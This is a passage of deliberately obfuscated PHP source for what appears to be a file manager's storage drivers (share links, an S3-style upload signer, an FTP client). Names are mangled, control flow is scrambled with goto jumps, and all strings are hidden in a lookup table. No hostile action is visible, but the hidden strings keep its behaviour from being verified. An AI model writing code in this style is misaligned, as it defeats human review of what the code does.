$A­ôÜ´šÙö, $aÀƒñ•‡„÷ = false) { return $this->copyMove($Dæå’´»ŒÇ, $A­ôÜ´šÙö, $aÀƒñ•‡„÷, $_SERVER[©][498]); } public function move($f¡»ÕÆÒ‚”, $bóµ¾„Äç, $FŠ½×«•õ = false) { return $this->copyMove($f¡»ÕÆÒ‚”, $bóµ¾„Äç, $FŠ½×«•õ, $_SERVER[©][500]); } private function copyMove($AÎÈ§ØŞÓ”, $Fà¤¾µ’ãµ, $F°Æ¶ßŠ¬, $e‹ù”—®Ô—) { goto dôÂ†¸®İ©; d‡Ê˜­»øç: if ($EÎÔŞ§ªÓ¹->pathParse[$Cêô‚óùŞÏ[995]]) { $Fà¤¾µ’ãµ = $EÎÔŞ§ªÓ¹->pathParse[$Cêô‚óùŞÏ[995]]; } else { $Fà¤¾µ’ãµ = $Eä±ÍùÔˆ§; } $f‰—“‚Æº– = IO::copyMove($AÎÈ§ØŞÓ”, $Fà¤¾µ’ãµ, $F°Æ¶ßŠ¬, $e‹ù”—®Ô—); $f‰—“‚Æº– = $this->getPathOuter($f‰—“‚Æº–); goto e‚³•íËãº; e‚³•íËãº: return $f‰—“‚Æº–; goto DÀ·Á£¾’; dôÂ†¸®İ©: $Cêô‚óùŞÏ =& $_SERVER[©]; $Eä±ÍùÔˆ§ = $Fà¤¾µ’ãµ; $EÎÔŞ§ªÓ¹ = IO::driverMake($Fà¤¾µ’ãµ); goto d‡Ê˜­»øç; DÀ·Á£¾’: } public function pathFather($FÜ«æ²) { return get_path_father($this->pathParse[$_SERVER[©][85]]); } public function iconvSystem($dÔã”Õ¤²§) { return $dÔã”Õ¤²§; } protected function infoParse($a‹…Àæ¶Õ, $eáÁĞ™×Áç = false) { $dÕÁÂêÃã =& $_SERVER[©]; $bÖ°‘™—ˆ© = $this->pathParse[$dÕÁÂêÃã[447]][$dÕÁÂêÃã[1016]] . $this->pathParse[$dÕÁÂêÃã[1009]]; if ($eáÁĞ™×Áç) { $D…ƒå«åöÎ = IO::infoWithChildren($bÖ°‘™—ˆ©); } else { $D…ƒå«åöÎ = IO::info($bÖ°‘™—ˆ©); } $eâ…º­ğÌ¬ = $this->pathParse[$dÕÁÂêÃã[447]]; return Action($dÕÁÂêÃã[1121])->_shareItemeParse($D…ƒå«åöÎ, $eâ…º­ğÌ¬); } public function listAll($C©ŸÉà£Š) { $CŞŠàÛìæ™ =& $_SERVER[©]; $F±Ò’¿ÓĞÏ = IO::listAll($C©ŸÉà£Š); $e·Ï´Ã·Ä = $this->pathParse[$CŞŠàÛìæ™[447]]; foreach ($F±Ò’¿ÓĞÏ as &$F³éê¸‰ˆ†) { check_abort(); $F³éê¸‰ˆ† = array_merge(IO::info($F³éê¸‰ˆ†[$CŞŠàÛìæ™[85]]), $F³éê¸‰ˆ†); $F³éê¸‰ˆ†[$CŞŠàÛìæ™[399]] = Action($CŞŠàÛìæ™[1121])->_shareItemeParse($F³éê¸‰ˆ†, $e·Ï´Ã·Ä); } return $F±Ò’¿ÓĞÏ; } public function getPathOuter($A‚Ãâ±Õï×) { goto B‚ô“ºõà´; B‚ô“ºõà´: $D­áËØƒ’Å =& $_SERVER[©]; $E¨©…ÆŞªé = KodIO::parse($A‚Ãâ±Õï×); if ($E¨©…ÆŞªé[$D­áËØƒ’Å[39]] == KodIO::KOD_SHARE_ITEM) { return $E¨©…ÆŞªé[$D­áËØƒ’Å[85]]; } goto eÕ •Í”†œ; eÕ •Í”†œ: $E‹šˆøš¼ = KodIO::clear($A‚Ãâ±Õï×); $c»„šÊ‡Ãå = KodIO::clear($this->pathParse[$D­áËØƒ’Å[447]][$D­áËØƒ’Å[1016]]); $E¯°‡íšØî = substr($E‹šˆøš¼, strlen($c»„šÊ‡Ãå)); goto eÀÚÙËøñÉ; eÀÚÙËøñÉ: if (substr($E‹šˆøš¼, 0, strlen($c»„šÊ‡Ãå)) != $c»„šÊ‡Ãå) { return !1; } return $this->pathParse[$D­áËØƒ’Å[1010]] . $D­áËØƒ’Å[18] . ltrim($E¯°‡íšØî, $D­áËØƒ’Å[18]); goto e‰¦É©ŠÃÓ; e‰¦É©ŠÃÓ: } public function getType() { $E¶ÆÎ¸‰” =& $_SERVER[©]; $F…Óä¿® = str_replace($E¶ÆÎ¸‰”[81], $E¶ÆÎ¸‰”[43], get_class($this)); return strtolower($F…Óä¿®); } public function isTypeObject($D×¿˜ô”®Ş) { return IO::isTypeObject($D×¿˜ô”®Ş); } public function info($cÚ‹ùÎ‚¾) { return $this->infoParse($cÚ‹ùÎ‚¾); } public function infoAuth($CÁÚñëø¿„) { return $this->infoParse($CÁÚñëø¿„); } public function infoWithChildren($FÁ¾°—‘ç‹) { return $this->infoParse($FÁ¾°—‘ç‹, !0); } public function infoFull($EØÂ™«ŠÒĞ) { return $this->infoParse($EØÂ™«ŠÒĞ); } } goto fŒßº„‘¯; fŒßº„‘¯: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($D„íÄ¥‹±ì) { $this->pathParse = $D„íÄ¥‹±ì; } protected function infoParse($EŞ½…¹×ÇÀ, $B†ŞàÔ½äë = false) { $C÷’ÙŠ¯ì =& $_SERVER[©]; return Action($C÷’ÙŠ¯ì[1015])->sharePathInfo($this->pathParse[$C÷’ÙŠ¯ì[85]], !0, $B†ŞàÔ½äë); } public function listPath($f”Òù¹†„, $d†¬–ÚĞŸ = false) { $DŒ»Æ£ãÖ‹ =& $_SERVER[©]; $DĞ®Ñªâ£ = IO::listPath($f”Òù¹†„, $d†¬–ÚĞŸ); foreach ($DĞ®Ñªâ£ as $F¥¸¿ˆÔ˜ => $dİ„ÜÁÅÕ‚) { if (!in_array($F¥¸¿ˆÔ˜, array($DŒ»Æ£ãÖ‹[83], $DŒ»Æ£ãÖ‹[84]))) { continue; } foreach ($dİ„ÜÁÅÕ‚ as $AÊò ’ÓË‡ => $B†Ô†ÑŠÇŸ) { $B†Ô†ÑŠÇŸ = Action($DŒ»Æ£ãÖ‹[1130])->parsePathChildren($B†Ô†ÑŠÇŸ, array($DŒ»Æ£ãÖ‹[395] => $f”Òù¹†„)); $DĞ®Ñªâ£[$F¥¸¿ˆÔ˜][$AÊò ’ÓË‡] = Action($DŒ»Æ£ãÖ‹[1015])->shareItemInfo($B†Ô†ÑŠÇŸ); } } return $DĞ®Ñªâ£; } public function listAll($a¢¤ëŞĞÚ) { $E•ÂÂ¥ÍÜŸ =& $_SERVER[©]; $fÍÂ±Æ²ˆ = IO::listAll($a¢¤ëŞĞÚ); foreach ($fÍÂ±Æ²ˆ as &$FÜîáåù–õ) { $FÜîáåù–õ = array_merge(IO::info($FÜîáåù–õ[$E•ÂÂ¥ÍÜŸ[85]]), $FÜîáåù–õ); $FÜîáåù–õ[$E•ÂÂ¥ÍÜŸ[399]] = Action($E•ÂÂ¥ÍÜŸ[1015])->shareItemInfo($FÜîáåù–õ); } return $fÍÂ±Æ²ˆ; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($D¬¹®‰ê…À) { parent::__construct($D¬¹®‰ê…À); $this->signatureVersion($_SERVER[©][210]); } public function uploadFormData($E©÷×Æ›„¿, $f¡Ãƒ¢¨– = 3600) { goto DÈ¸æ›ÕÇÙ; fàƒ’ëÛ„ï: $cÍ«Ò½òô£ = array($BÓĞåÀ Ÿù[209] => $BÓĞåÀ Ÿù[43], $BÓĞåÀ Ÿù[1143] => $BÓĞåÀ Ÿù[43], $BÓĞåÀ Ÿù[1101] => $Fß°”¯çÈ, $BÓĞåÀ Ÿù[1105] => $B‡Ìœ³“Î, $BÓĞåÀ Ÿù[1109] => $Fñ„•Ï‘ƒ°, $BÓĞåÀ Ÿù[1144] => $FÃå¯âÂİŠ, $BÓĞåÀ Ÿù[1145] => $FÏ†ëÁøºÂ, $BÓĞåÀ Ÿù[1146] => $d°„§ìå‚, $BÓĞåÀ Ÿù[1147] => $DŠÖ—ïøŠ, $BÓĞåÀ Ÿù[1148] => $b¢ñ ‘‡, $BÓĞåÀ Ÿù[179] => $this->getHost()); return $cÍ«Ò½òô£; goto a†ÈÀ“»½; DÈ¸æ›ÕÇÙ: $BÓĞåÀ Ÿù =& $_SERVER[©]; $Fß°”¯çÈ = $BÓĞåÀ Ÿù[195]; $FÏ†ëÁøºÂ = $BÓĞåÀ Ÿù[1131]; goto a‰Ô…ÃˆøÑ; aÚ¸ììÅµ: $Fñ„•Ï‘ƒ° = base64_encode(json_encode($FÙ·ˆ¨„å)); $Dß‡¢›Ùˆ— = hash_hmac($BÓĞåÀ Ÿù[1141], $eò±òÑÖ†¿, $BÓĞåÀ Ÿù[1142] . $this->secret, !0); $BØÁ‡¼Ç³§ = hash_hmac($BÓĞåÀ Ÿù[1141], $this->region, $Dß‡¢›Ùˆ—, !0); goto c‹¼¾…è¢; aÓÍô¦À²: $CÃÕ‰Çßù = $BÓĞåÀ Ÿù[1133]; $DŠÖ—ïøŠ = $f¡Ãƒ¢¨– . $BÓĞåÀ Ÿù[43]; $B‡Ìœ³“Î = $BÓĞåÀ Ÿù[1097]; goto b”ÕÇÈ¢º¨; a‰Ô…ÃˆøÑ: $bÔ¶ĞŸ±ÃŞ = $BÓĞåÀ Ÿù[69]; $d°„§ìå‚ = gmdate($BÓĞåÀ Ÿù[1132]); $eò±òÑÖ†¿ = gmdate($BÓĞåÀ Ÿù[689]); goto aÓÍô¦À²; c‹¼¾…è¢: $a¾˜š«‡µ = hash_hmac($BÓĞåÀ Ÿù[1141], $bÔ¶ĞŸ±ÃŞ, $BØÁ‡¼Ç³§, !0); $aà•Ãˆ×Ä‰ = hash_hmac($BÓĞåÀ Ÿù[1141], $CÃÕ‰Çßù, $a¾˜š«‡µ, !0); $b¢ñ ‘‡ = hash_hmac($BÓĞåÀ Ÿù[1141], $Fñ„•Ï‘ƒ°, $aà•Ãˆ×Ä‰); goto fàƒ’ëÛ„ï; b”ÕÇÈ¢º¨: $c‹÷ï…¸Öà = array($this->accessKey, $eò±òÑÖ†¿, $this->region, $bÔ¶ĞŸ±ÃŞ, $CÃÕ‰Çßù); $FÃå¯âÂİŠ = implode($BÓĞåÀ Ÿù[18], $c‹÷ï…¸Öà); $FÙ·ˆ¨„å = array($BÓĞåÀ Ÿù[1099] => gmdate($BÓĞåÀ Ÿù[1098], strtotime($BÓĞåÀ Ÿù[1134])), $BÓĞåÀ Ÿù[1100] => array(array($BÓĞåÀ Ÿù[1102] => $this->bucket), array($BÓĞåÀ Ÿù[1101] => $Fß°”¯çÈ), array($BÓĞåÀ Ÿù[1103], $BÓĞåÀ Ÿù[1104], $BÓĞåÀ Ÿù[43]), array($BÓĞåÀ Ÿù[1103], $BÓĞåÀ Ÿù[1135], $BÓĞåÀ Ÿù[43]), array($BÓĞåÀ Ÿù[1103], $BÓĞåÀ Ÿù[1136], $BÓĞåÀ Ÿù[43]), array($BÓĞåÀ Ÿù[1105] => $B‡Ìœ³“Î), array($BÓĞåÀ Ÿù[1137] => $FÃå¯âÂİŠ), array($BÓĞåÀ Ÿù[1138] => $FÏ†ëÁøºÂ), array($BÓĞåÀ Ÿù[1139] => $d°„§ìå‚), array($BÓĞåÀ Ÿù[1140] => $DŠÖ—ïøŠ))); goto aÚ¸ììÅµ; a†ÈÀ“»½: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($BÀ•‚‘ê£) { parent::__construct(); if (count($BÀ•‚‘ê£) > 0) { $this->_init($BÀ•‚‘ê£); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($d©Å×âµ³) { $fÈ•‹ØÕìÒ =& $_SERVER[©]; global $config; $this->appCharset = $config[$fÈ•‹ØÕìÒ[1149]]; $this->systemCharset = $config[$fÈ•‹ØÕìÒ[1150]]; if (isset($d©Å×âµ³[$fÈ•‹ØÕìÒ[1151]]) && $d©Å×âµ³[$fÈ•‹ØÕìÒ[1151]]) { $this->systemCharset = $d©Å×âµ³[$fÈ•‹ØÕìÒ[1151]]; } } public function iconvApp($D›ğ†ãÕÃ) { return $this->iconvTo($D›ğ†ãÕÃ, $this->systemCharset, $this->appCharset); } public function iconvSystem($FÀ²Ù‚›Ô†) { return $this->iconvTo($FÀ²Ù‚›Ô†, $this->appCharset, $this->systemCharset); } public function getPathOuter($cà§”‰Ù³˜) { goto AŞËšÓ®·²; AŞËšÓ®·²: $DÅ‡ÜöãÅŒ =& $_SERVER[©]; $d„Í£ñ¢Ø¨ = $this->iconvApp($this->pathBase); $cà§”‰Ù³˜ = $this->iconvApp($cà§”‰Ù³˜); goto fÉíÀâ‡ù; E½•ºöÌÇ: $cà§”‰Ù³˜ = KodIO::clear($cà§”‰Ù³˜); $cà§”‰Ù³˜ = substr($cà§”‰Ù³˜, strlen($d„Í£ñ¢Ø¨)); if (empty($this->pathDriver)) { return $cà§”‰Ù³˜; } goto f¿±Õ¼ĞĞ¼; fÉíÀâ‡ù: if (substr($d„Í£ñ¢Ø¨, 0, 2) == $DÅ‡ÜöãÅŒ[1152]) { $d„Í£ñ¢Ø¨ = BASIC_PATH . substr($d„Í£ñ¢Ø¨, 2); } if (substr($cà§”‰Ù³˜, 0, 2) == $DÅ‡ÜöãÅŒ[1152]) { $cà§”‰Ù³˜ = BASIC_PATH . substr($cà§”‰Ù³˜, 2); } $d„Í£ñ¢Ø¨ = KodIO::clear($d„Í£ñ¢Ø¨); goto E½•ºöÌÇ; f¿±Õ¼ĞĞ¼: return $this->pathDriver . $DÅ‡ÜöãÅŒ[18] . ltrim($cà§”‰Ù³˜, $DÅ‡ÜöãÅŒ[18]); goto c”ƒÀÎ÷Ùå; c”ƒÀÎ÷Ùå: } private function _init($bêƒ„§ç¥ = array()) { $D¥’ÁÄ¿‘ =& $_SERVER[©]; if (!function_exists($D¥’ÁÄ¿‘[1153])) { show_json(LNG($D¥’ÁÄ¿‘[1154]), !1); } $this->config = $bêƒ„§ç¥; $this->charsetReset($bêƒ„§ç¥); foreach ($bêƒ„§ç¥ as $eå¿¼ê»êî => $eƒ™µÊ¸£) { if (isset($this->{$eå¿¼ê»êî})) { $this->{$eå¿¼ê»êî} = $eƒ™µÊ¸£; } } return $this->_login($bêƒ„§ç¥); } private function _login($eœ¨†Ê¼) { goto E­çåÃÈ›; E­çåÃÈ›: $BŒô›¤é¾ =& $_SERVER[©]; static $aÉ‰¶Ó¯†® = array(); $B³œË‘£óï = md5(json_encode($eœ¨†Ê¼)); goto bù®Ú¡ßòÊ; bù®Ú¡ßòÊ: if (isset($aÉ‰¶Ó¯†®[$B³œË‘£óï])) { foreach ($aÉ‰¶Ó¯†®[$B³œË‘£óï] as $c¼šÄà×ÜŠ => $Aš­Ì‚Ôò”) { $this->{$c¼šÄà×ÜŠ} = $Aš­Ì‚Ôò”; } return !0; } $A½ÅíÑ¹é³ = parse_url(trim($this->server, $BŒô›¤é¾[18])); $this->host = $A½ÅíÑ¹é³[$BŒô›¤é¾[179]]; goto C½ÎŠè¬«; bË´àœ “: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $dïò‹È©Ôï = @ftp_login($this->connect, $this->username, $this->userpass); goto DŸ—ñˆ¯Ìá; DŸ—ñˆ¯Ìá: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $eöÚ‹×Ÿ­ = $this->pasv == $BŒô›¤é¾[93] ? !0 : !1; @ftp_pasv($this->connect, $eöÚ‹×Ÿ­); goto B—¢ª‘…Ÿ‡; C½ÎŠè¬«: $aˆ—¥šô = isset($A½ÅíÑ¹é³[$BŒô›¤é¾[178]]) && $A½ÅíÑ¹é³[$BŒô›¤é¾[178]] == $BŒô›¤é¾[1155] ? !0 : !1; $this->scheme = $aˆ—¥šô ? $BŒô›¤é¾[1156] : $BŒô›¤é¾[1157]; $this->port = isset($A½ÅíÑ¹é³[$BŒô›¤é¾[180]]) ? $A½ÅíÑ¹é³[$BŒô›¤é¾[180]] : 21; goto bË´àœ “; B—¢ª‘…Ÿ‡: $aÉ‰¶Ó¯†®[$B³œË‘£óï] = array($BŒô›¤é¾[1158] => $this->connect, $BŒô›¤é¾[179] => $this->host, $BŒô›¤é¾[178] => $this->scheme, $BŒô›¤é¾[180] => $this->port); return $dïò‹È©Ôï; goto F¤•ºÅÆ³; F¤•ºÅÆ³: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($däÈ¨Ü÷, $AÙŒ£ç¿à = '', $BÛÍ–¯‡Ú‡ = REPEAT_RENAME) { if ($this->setContent($däÈ¨Ü÷, $AÙŒ£ç¿à)) { return $this->getPathOuter($däÈ¨Ü÷); } return !1; } public function mkdir($CÂ³âóŒÄ, $eƒÅ×ìµ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $CÂ³âóŒÄ = $this->iconvSystem($CÂ³âóŒÄ); if ($this->isFolder($CÂ³âóŒÄ) || @ftp_mkdir($this->connect, $CÂ³âóŒÄ)) { return $this->getPathOuter($CÂ³âóŒÄ); } if (!$this->mkdir($this->pathFather($CÂ³âóŒÄ))) { return !1; } if ($CÂ³âóŒÄ = @ftp_mkdir($this->connect, $CÂ³âóŒÄ)) { return $this->getPathOuter($CÂ³âóŒÄ); } return !1; } public function copyFile($fİñŠÄÎ­, $Eø‘³Œ§“È) { goto E‚”ÔÍ¸ˆí; A¾éÒ˜‹ª: $dãš¦¬ğÍñ = $this->iconvApp($BÂŞİÔ¾÷ø); $this->download($fİñŠÄÎ­, $dãš¦¬ğÍñ); $bßêÏÏŠ = $this->upload($Eø‘³Œ§“È, $dãš¦¬ğÍñ); goto B”•º†Ë‘; E‚”ÔÍ¸ˆí: if (!$this->_isconn()) { return !1; } $B¾å’á†ùÌ = $this->pathThis($this->iconvSystem($fİñŠÄÎ­)); $BÂŞİÔ¾÷ø = $this->tempFile($B¾å’á†ùÌ); goto A¾éÒ˜‹ª; B”•º†Ë‘: $this->tempFileRemve($BÂŞİÔ¾÷ø); return $bßêÏÏŠ; goto F›†» ™õ»; F›†» ™õ»: } public function moveFile($B÷ª Ú¨Çæ, $E­öåÆ¾Ç) { if (!$this->_isconn()) { return !1; } $B÷ª Ú¨Çæ = $this->iconvSystem($B÷ª Ú¨Çæ); $E­öåÆ¾Ç = $this->iconvSystem($E­öåÆ¾Ç); $E«¥‹µË¸Œ = @ftp_rename($this->connect, $B÷ª Ú¨Çæ, $E­öåÆ¾Ç); return $E«¥‹µË¸Œ ? $this->getPathOuter($E­öåÆ¾Ç) : !1; } public function delFile($CËãÓ‰”–‡) { if (!$this->_isconn()) { return !1; } $CËãÓ‰”–‡ = $this->iconvSystem($CËãÓ‰”–‡); return @ftp_delete($this->connect, $CËãÓ‰”–‡); } public function delFolder($EğÂ²ğ½) { if (!$this->_isconn()) { return !1; } $EğÂ²ğ½ = $this->iconvSystem($EğÂ²ğ½); $D¢°¹ÃËÅá = $this->ftpList($EğÂ²ğ½); if (!$D¢°¹ÃËÅá) { return @ftp_rmdir($this->connect, $EğÂ²ğ½); } foreach ($D¢°¹ÃËÅá as $d»µ‘ŞÔÓÕ) { if ($this->isFolder($d»µ‘ŞÔÓÕ)) { $d»µ‘ŞÔÓÕ = $this->iconvApp($d»µ‘ŞÔÓÕ); $this->delFolder($d»µ‘ŞÔÓÕ); } else { @ftp_delete($this->connect, $d»µ‘ŞÔÓÕ); } } return @ftp_rmdir($this->connect, $EğÂ²ğ½); } public function rename($f×Œµ½Üï, $d½‡Ş…¾¹) { goto C¼àì ¹†·; bÁ—ª½Ü: $eÙÅ…ëùŒ = $this->iconvSystem($eÙÅ…ëùŒ); $f×Œµ½Üï = $this->iconvSystem($f×Œµ½Üï); $C‰èî‰ˆ¶ô = $this->pathFather($f×Œµ½Üï); goto fÌ†´¨‡”; C¼àì ¹†·: $bÒïó‡Õ¤Ó =& $_SERVER[©]; if (!$this->_isconn()) { return !1; } $eÙÅ…ëùŒ = $this->fileNameAuto($this->pathFather($f×Œµ½Üï), $d½‡Ş…¾¹); goto bÁ—ª½Ü; fÌ†´¨‡”: $e…¡À°™™ñ = rtrim($C‰èî‰ˆ¶ô, $bÒïó‡Õ¤Ó[18]) . $bÒïó‡Õ¤Ó[18] . $eÙÅ…ëùŒ; $cÁˆÑ…‡ = @ftp_rename($this->connect, $f×Œµ½Üï, $e…¡À°™™ñ); $e…¡À°™™ñ = $this->iconvApp($e…¡À°™™ñ); goto D†‹³Œ™ê­; D†‹³Œ™ê­: return $cÁˆÑ…‡ ? $this->getPathOuter($e…¡À°™™ñ) : !1; goto C‹‡ ¸Ô‘; C‹‡ ¸Ô‘: } private function folderInfo($d§ô¶Ñ„‹, $a¹µÏß  = false) { goto F®Î ã†÷™; F®Î ã†÷™: $bÕØàÉ‚÷ =& $_SERVER[©]; $fğ½¥÷Ç× = $this->getPathOuter(rtrim($d§ô¶Ñ„‹, $bÕØàÉ‚÷[18])); $FÀŸ²²‡ƒ„ = $this->pathThis($fğ½¥÷Ç×); goto E°¼ÌÇ²–é; a¢—ğ¬‡: return $Bãˆ®£´´; goto DâÛØÎ‹¸ø; E°¼ÌÇ²–é: $bçŒƒ‘Ãí = $this->iconvSystem($d§ô¶Ñ„‹); if ($a¹µÏß ) { return array($bÕØàÉ‚÷[38] => $FÀŸ²²‡ƒ„, $bÕØàÉ‚÷[85] => $fğ½¥÷Ç×, $bÕØàÉ‚÷[39] => $bÕØàÉ‚÷[86]); } $Bãˆ®£´´ = array($bÕØàÉ‚÷[38] => $FÀŸ²²‡ƒ„, $bÕØàÉ‚÷[85] => $fğ½¥÷Ç×, $bÕØàÉ‚÷[39] => $bÕØàÉ‚÷[86], $bÕØàÉ‚÷[197] => 0, $bÕØàÉ‚÷[117] => 0, $bÕØàÉ‚÷[1159] => !0, $bÕØàÉ‚÷[1160] => !0); goto a¢—ğ¬‡; DâÛØÎ‹¸ø: } private function fileInfo($CŠ³ÀÜ ›, $bùèÖœŠó· = false) { goto aÄ¬Óå·Šã; FÄ„å÷éé: $Añˆ‡¼¯Á = $this->iconvSystem($CŠ³ÀÜ ›); if ($bùèÖœŠó·) { return array($dˆãÙƒá¿[38] => $EºßÜÂæÁ¹, $dˆãÙƒá¿[85] => $cƒñé²ÎÇ, $dˆãÙƒá¿[39] => $dˆãÙƒá¿[177], $dˆãÙƒá¿[170] => $this->ext($CŠ³ÀÜ ›), $dˆãÙƒá¿[87] => $this->size($CŠ³ÀÜ ›)); } $BŒ¡î›ï = array($dˆãÙƒá¿[38] => $EºßÜÂæÁ¹, $dˆãÙƒá¿[85] => $cƒñé²ÎÇ, $dˆãÙƒá¿[39] => $dˆãÙƒá¿[177], $dˆãÙƒá¿[197] => 0, $dˆãÙƒá¿[117] => @ftp_mdtm($this->connect, $Añˆ‡¼¯Á), $dˆãÙƒá¿[170] => $this->ext($CŠ³ÀÜ ›), $dˆãÙƒá¿[87] => $this->size($CŠ³ÀÜ ›), $dˆãÙƒá¿[1159] => !0, $dˆãÙƒá¿[1160] => !0); goto DÒŒàè‰•„; DÒŒàè‰•„: $BŒ¡î›ï[$dˆãÙƒá¿[117]] = $BŒ¡î›ï[$dˆãÙƒá¿[117]] > 0 ? $BŒ¡î›ï[$dˆãÙƒá¿[117]] : 0; return $BŒ¡î›ï; goto d“¬‹¬ÎéÌ; aÄ¬Óå·Šã: $dˆãÙƒá¿ =& $_SERVER[©]; $cƒñé²ÎÇ = $this->getPathOuter(rtrim($CŠ³ÀÜ ›, $dˆãÙƒá¿[18])); $EºßÜÂæÁ¹ = $this->pathThis($cƒñé²ÎÇ); goto FÄ„å÷éé; d“¬‹¬ÎéÌ: } public function size($Dî¡À‚î¤) { $Bä¦¾¤Ôğá = $this->objectMeta($Dî¡À‚î¤); return $Bä¦¾¤Ôğá ? $Bä¦¾¤Ôğá[$_SERVER[©][87]] : 0; } public function info($F•èñ¸†ñ÷) { if ($this->isFile($F•èñ¸†ñ÷)) { return $this->fileInfo($F•èñ¸†ñ÷, 0); } else { if ($this->isFolder($F•èñ¸†ñ÷)) { return $this->folderInfo($F•èñ¸†ñ÷); } } return !1; } public function exist($dÉÄ×áã¾) { return $this->objectMeta($dÉÄ×áã¾) ? !0 : !1; } public function isFile($FÊ¶ã­¶×˜) { $dŒ˜Ñä¤Ïõ =& $_SERVER[©]; $BÂÌâ‡´ğ = $this->objectMeta($FÊ¶ã­¶×˜); return $BÂÌâ‡´ğ ? $BÂÌâ‡´ğ[$dŒ˜Ñä¤Ïõ[39]] == $dŒ˜Ñä¤Ïõ[177] : !1; } public function isFolder($Dñ…öÊİÒ˜) { $C‘‘ßå× =& $_SERVER[©]; $d™¶æ¨¿Ø = $this->objectMeta($Dñ…öÊİÒ˜); return $d™¶æ¨¿Ø ? $d™¶æ¨¿Ø[$C‘‘ßå×[39]] == $C‘‘ßå×[86] : !1; } public function listPath($d´†¹Íƒ×, $E®ˆ³Ÿ›Úƒ = false) { goto dİâ¾¤³Š„; d÷“‰¤ˆÓ²: foreach ($bí¯İ©İŸâ as $d´†¹Íƒ×) { if ($this->isFolder($d´†¹Íƒ×)) { $AòÅÏòĞ¢ò[$fôˆÓºğ¬­[84]][] = $this->folderInfo($d´†¹Íƒ×, $E®ˆ³Ÿ›Úƒ); } else { $AòÅÏòĞ¢ò[$fôˆÓºğ¬­[83]][] = $this->fileInfo($d´†¹Íƒ×, $E®ˆ³Ÿ›Úƒ); } } return $AòÅÏòĞ¢ò; goto D™¼‘¶Õ»¯; dİâ¾¤³Š„: $fôˆÓºğ¬­ =& $_SERVER[©]; if (!$this->_isconn()) { return !1; } $d´†¹Íƒ× = $this->iconvSystem($d´†¹Íƒ×); goto f„œòê÷ñ•; f„œòê÷ñ•: $bí¯İ©İŸâ = $this->ftpList($d´†¹Íƒ×); $AòÅÏòĞ¢ò = array($fôˆÓºğ¬­[84] => array(), $fôˆÓºğ¬­[83] => array()); if (!$bí¯İ©İŸâ) { return $AòÅÏòĞ¢ò; } goto d÷“‰¤ˆÓ²; D™¼‘¶Õ»¯: } public function has($AªÊª ›Û, $bìÑ‹çËÆĞ = false, $Dš©é¢ƒâÂ = true) { goto fê¯ô¨Œ¯; A¾§Ô¨¸õ: $aõ£µ¥ù¿Ã = $this->ftpList($AªÊª ›Û); if (!$aõ£µ¥ù¿Ã) { return !1; } if ($bìÑ‹çËÆĞ) { return array($e–ŠÍ×ìå¦[201] => 0, $e–ŠÍ×ìå¦[202] => count($aõ£µ¥ù¿Ã)); } goto c¬¸ÕÈš; fê¯ô¨Œ¯: $e–ŠÍ×ìå¦ =& $_SERVER[©]; if (!$this->_isconn()) { return !1; } $AªÊª ›Û = $this->iconvSystem($AªÊª ›Û); goto A¾§Ô¨¸õ; c¬¸ÕÈš: foreach ($aõ£µ¥ù¿Ã as $AªÊª ›Û) { if ($Dš©é¢ƒâÂ) { if (!$this->isFolder($AªÊª ›Û)) { return !0; } } else { if ($this->isFolder($AªÊª ›Û)) { return !0; } } } return !1; goto bÄ¬µÒŒ½§; bÄ¬µÒŒ½§: } public function listAll($aÒ‘é¸Ì±°) { goto d‘É´¿ºÏ£; bºœèëÏ¯: foreach ($Eİ–„±¦¥é[$fÓ¦„‚Œõà[84]] as $D¦é±Õï‘‚) { $Aé±ù’ÇÈ¹[] = array($fÓ¦„‚Œõà[85] => $fÓ¦„‚Œõà[18] . trim(str_replace($aÒ‘é¸Ì±°, $fÓ¦„‚Œõà[43], $D¦é±Õï‘‚), $fÓ¦„‚Œõà[18]) . $fÓ¦„‚Œõà[18], $fÓ¦„‚Œõà[86] => 1, $fÓ¦„‚Œõà[87] => 0); } foreach ($Eİ–„±¦¥é[$fÓ¦„‚Œõà[83]] as $BËˆ„¦¬§”) { $Aé±ù’ÇÈ¹[] = array($fÓ¦„‚Œõà[85] => $fÓ¦„‚Œõà[18] . trim(str_replace($aÒ‘é¸Ì±°, $fÓ¦„‚Œõà[43], $BËˆ„¦¬§”), $fÓ¦„‚Œõà[18]), $fÓ¦„‚Œõà[86] => 0, $fÓ¦„‚Œõà[87] => $this->size($BËˆ„¦¬§”)); } return $Aé±ù’ÇÈ¹; goto c«³ŸÜ¡…; d‘É´¿ºÏ£: $fÓ¦„‚Œõà =& $_SERVER[©]; if (!$this->_isconn()) { return !1; } $aÒ‘é¸Ì±° = $this->iconvSystem($aÒ‘é¸Ì±°); goto EæàÀ£°ˆ»; EæàÀ£°ˆ»: $Eİ–„±¦¥é = array($fÓ¦„‚Œõà[83] => array(), $fÓ¦„‚Œõà[84] => array()); $this->recursionFtpFiles($aÒ‘é¸Ì±°, $Eİ–„±¦¥é); $Aé±ù’ÇÈ¹ = array(); goto bºœèëÏ¯; c«³ŸÜ¡…: } public function getContent($a©¨Ì´÷Â) { if (!$this->_isconn()) { return !1; } $a©¨Ì´÷Â = $this->iconvSystem($a©¨Ì´÷Â); return $this->fileSubstr($a©¨Ì´÷Â); } public function setContent($A†¯ªèÄ, $Dàß×ñ¸Ÿ¥ = '') { goto eæíÓòéÖğ; eæíÓòéÖğ: if (!$this->_isconn()) { return !1; } $B¾‡ø‹·©Ş = $this->pathThis($this->iconvSystem($A†¯ªèÄ)); $dÄË¯£–Ô¤ = $this->tempFile($B¾‡ø‹·©Ş); goto dï˜•çÛÍâ; dï˜•çÛÍâ: file_put_contents($dÄË¯£–Ô¤, $Dàß×ñ¸Ÿ¥); $FØî””¢—³ = $this->upload($A†¯ªèÄ, $this->iconvApp($dÄË¯£–Ô¤)); $this->tempFileRemve($dÄË¯£–Ô¤); goto AŠ¦·²×òˆ; AŠ¦·²×òˆ: return $FØî””¢—³; goto eàĞ®ííù; eàĞ®ííù: } public function 